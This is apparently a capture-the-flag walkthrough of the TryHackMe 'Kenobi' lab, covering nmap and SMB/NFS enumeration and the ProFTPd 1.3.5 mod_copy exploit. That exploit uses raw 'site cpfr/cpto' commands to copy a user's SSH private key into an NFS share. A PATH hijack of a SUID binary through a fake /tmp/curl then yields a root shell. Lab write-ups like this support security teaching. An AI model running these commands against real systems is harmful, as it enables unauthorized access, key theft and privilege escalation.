## 1. Enumeration

Start classic synscan : 
```bash
┌──(kali㉿kali)-[~/TryHackMe/Kenobi]
└─$ sudo nmap -sS 10.10.145.89 -oN stealth_scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 04:52 EST
Nmap scan report for 10.10.145.89
Host is up (0.034s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

We can now focus on the ports that we found with an agressive scan :

```bash
┌──(kali㉿kali)-[~/TryHackMe/Kenobi]
└─$ sudo nmap -A 10.10.145.89 -p21,22,80,111,139,445,2049 -oN aggressive_scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 04:54 EST
Nmap scan report for 10.10.145.89
Host is up (0.031s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33631/tcp   mountd
|   100005  1,2,3      35065/tcp6  mountd
|   100005  1,2,3      37043/udp   mountd
|   100005  1,2,3      45188/udp6  mountd
|   100021  1,3,4      33767/udp   nlockmgr
|   100021  1,3,4      42127/tcp   nlockmgr
|   100021  1,3,4      44875/tcp6  nlockmgr
|   100021  1,3,4      53970/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-08T09:54:17
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-11-08T03:54:18-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   31.69 ms 10.8.0.1
2   31.75 ms 10.10.145.89

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.35 seconds

```

We found :
- proFTPd  1.3.5 
- OpenSSH 7.2p2 
- Apache 2.4.18
- RPC 2-4
- SMB 4.3.11
- NFS 2-3

Now let's enumerate SMB
```bash
┌──(kali㉿kali)-[~/TryHackMe/Kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.145.89 -oN scans/smb_enum.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 05:05 EST
Nmap scan report for 10.10.145.89
Host is up (0.031s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.145.89\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.145.89\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.145.89\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 4.91 seconds

```

Anonymous shares stands outs, let's try to connect to it.

```bash
┌──(kali㉿kali)-[~/TryHackMe/Kenobi]
└─$ smbclient -N \\\\10.10.145.89\\anonymous                                                       
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877108 blocks available

```

Let's check the file. Great info about ftp and ssh key gen.

```bash
┌──(kali㉿kali)-[~/TryHackMe/Kenobi]
└─$ searchsploit ftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                                                  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                                                        | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                                                                    | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                                                                  | linux/remote/36742.txt
RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)                                                                                                                                                   | windows/remote/18190.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

NFS ENUM :

```bash
# Nmap 7.93 scan initiated Tue Nov  8 05:10:41 2022 as: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN scans/nfs_enum.txt 10.10.145.89
Nmap scan report for 10.10.145.89
Host is up (0.031s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

# Nmap done at Tue Nov  8 05:10:42 2022 -- 1 IP address (1 host up) scanned in 0.45 seconds

```

We can see that the nfs mount is /var

## 2. Exploit
ProFTPd 1.3.5 is vulnerable to *mod_copy* commands. We also found during our enumeration that there is some ssh key generated for kenobi in /home/kenobi/.ssh/id_rsa.

The main id is to use ***SITE CTFR*** and ***SITE CTPO*** to copy the rsa key to the /var/* for the nfs mount. 

```bash
┌──(kali㉿kali)-[~]
└─$ nc 10.10.145.89 21   
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.145.89]
site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
site cpto /var/id_rsa
250 Copy successful
```

Let's connect to the nfs
```bash
mkdir /mnt/kenobiNFS  
mount machine_ip:/var /mnt/kenobiNFS  
cp /mnt/kenobiNFS/id_rsa /home/TryHackMe/kenobi
```

The key has no password
Let's connect in ssh to the machine :
```bash
ssh -i id_rsa kenobi@10.10.145.89
```

```bash
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

## 3. PrivEsc

```bash
kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
**/usr/bin/menu**
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

We do a string on **/usr/bin/menu**
we find that it uses curl without the full path
to in tmp we create curl file with **/bin/bash**
we give permission 
we put in the path **/tmp**
we do **which** curl to verify that it uses **/tmp/curl **
and then sudo menu
option 1
and we root